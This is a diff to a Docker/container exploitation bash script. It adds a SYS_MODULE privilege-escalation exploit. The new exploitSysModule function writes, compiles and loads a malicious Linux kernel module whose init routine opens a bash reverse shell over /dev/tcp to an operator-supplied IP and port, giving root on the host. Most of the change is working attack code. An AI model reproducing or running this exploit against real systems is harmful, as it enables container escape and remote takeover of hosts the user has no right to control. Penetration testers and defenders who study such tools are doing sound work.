@@ -67,6 +67,7 @@ Usage: ${0##*/} [OPTIONS...]
     SOCK                 use an exposed docker sock to create a new container and mount root partition to priv esc
     CVE-2019-5746
     CVE-2019-5021
+    SYS_MODULE           Exploit the SYS_MODULE privilege to create a malicious kernel module and obtain root on the host
 
   ${DG}[Payloads & Options]$NC
   -i, --ip               The local host IP address for reverse shells to connect to
@@ -124,6 +125,8 @@ TIP_DOCKER_ROOTLESS="In rootless mode privilege escalation to root will not be p
 TIP_CVE_2019_5021="Alpine linux version 3.3.x-3.5.x accidentally allow users to login as root with a blank password, if we have command execution in the container we can become root using su root"
 TIP_CVE_2019_13139="Docker versions before 18.09.4 are vulnerable to a command execution vulnerability when parsing URLs"
 TIP_CVE_2019_5736="Docker versions before 18.09.2 are vulnerable to a container escape by overwriting the runC binary"
+
+TIP_SYS_MODULE="Giving the container the SYS_MODULE privilege allows for kernel modules to be mounted. Using this, a malicious module can be used to execute code as root on the host."
 
 DANGEROUS_GROUPS="docker\|lxd\|root\|sudo\|wheel"
 DANGEROUS_CAPABILITIES="cap_sys_admin\|cap_sys_ptrace\|cap_sys_module\|dac_read_search\|dac_override"
@@ -1112,6 +1115,92 @@ exploitDockerSock() {
   # TODO: Tidy up command
 }
 
+exploitSysModule(){
+  caps=$(capsh --print)
+  if [[ ! $caps =~ "cap_sys_module" ]];then
+    printError "We don't have the SYS_MODULE capability, which is required for this exploit"
+    exit 1
+  fi
+
+  if [[ -z "$ip" ]];then
+    printError "Missing reverse shell IP : use --ip"
+    exit 1
+  fi
+
+  if [[ -z "$port" ]]; then
+    printError "Missing reverse shell port : use --port"
+    exit 1
+  fi
+
+  printSection "Exploiting SYS_MODULE"
+  printTip "$TIP_SYS_MODULE"
+  
+  module_name=$(shuf -zer -n10 {a..z} {0..9} | tr -d '\0')
+  sys_cwd=$(pwd)
+
+  mkdir /dev/shm/rev && cd /dev/shm/rev
+
+  printQuestion "Writing scripts..."
+
+  # POC modified from https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
+  C_SRC=$(cat << EOF
+#include <linux/kmod.h>
+#include <linux/module.h>
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("AttackDefense");
+MODULE_DESCRIPTION("LKM reverse shell module");
+MODULE_VERSION("1.0");
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/HOST_IP/PORT 0>&1", NULL};
+static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
+static int __init MODULE_NAME_init(void) {
+return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+static void __exit MODULE_NAME_exit(void) {
+}
+module_init(MODULE_NAME_init);
+module_exit(MODULE_NAME_exit);
+EOF
+  )
+
+  echo "$C_SRC" | sed "s@HOST_IP@$ip@" | sed "s@PORT@$port@" | sed "s@MODULE_NAME@$module_name@" > "$module_name.c"
+
+  MAKEFILE=$(cat << EOF
+  obj-m +=MODULE_NAME.o\nall:\n\tmake -C /lib/modules/$(uname -r)/build M=$(pwd) modules\nclean:\n\tmake -C /lib/modules/$(uname -r)/build M=$(pwd) clean
+EOF
+  )
+
+  echo -e $MAKEFILE | sed "s@MODULE_NAME@$module_name@" > Makefile
+
+  printSuccess "Done"
+
+  printQuestion "Compiling kernel module..."
+
+  if make 1>/dev/null ; then
+    printSuccess "Done"
+  else
+    printError "Failed to make. Do you have all the required libraries installed?"
+  fi
+
+  printQuestion "Mounting kernel module..."
+
+  if insmod "$module_name.ko" 1>/dev/null ; then
+    printSuccess "Done"
+  else
+    printError "Failed to mount module" && exit 1
+  fi
+
+  printQuestion "Cleaning up..."
+
+  rm -r /dev/shm/rev
+
+  cd $sys_cwd
+
+  printSuccess "Done"
+
+  printSuccess "Check your reverse shell handler!"
+
+}
+
 ###########################################
 #--------------) Arg Parse (--------------#
 ###########################################
@@ -1245,6 +1334,9 @@ if [ "$exploit" ]; then
     ;;
   sock | SOCK)
     exploitDockerSock
+    ;;
+  sys | SYS | sys_module | SYS_MODULE)
+    exploitSysModule
     ;;
   *)
     echo "Unknown exploit $1"
